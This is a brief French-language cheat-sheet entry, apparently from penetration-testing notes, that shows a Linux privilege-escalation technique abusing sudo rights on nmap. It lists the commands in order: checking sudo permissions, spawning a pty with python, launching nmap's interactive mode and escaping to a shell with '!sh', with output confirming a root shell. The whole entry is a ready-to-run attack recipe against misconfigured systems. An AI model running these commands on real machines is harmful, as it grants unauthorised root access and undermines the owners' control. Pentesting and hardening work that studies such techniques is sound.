### Nmap
```bash
# Indentification
sudp -l
(root) NOPASSWD: /usr/bin/nmap

# Exploitation Avec GTOBINS
python -c 'import pty; pty.spawn("/bin/bash")'
sudo nmap --interactive
nmap> !sh
id 
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```
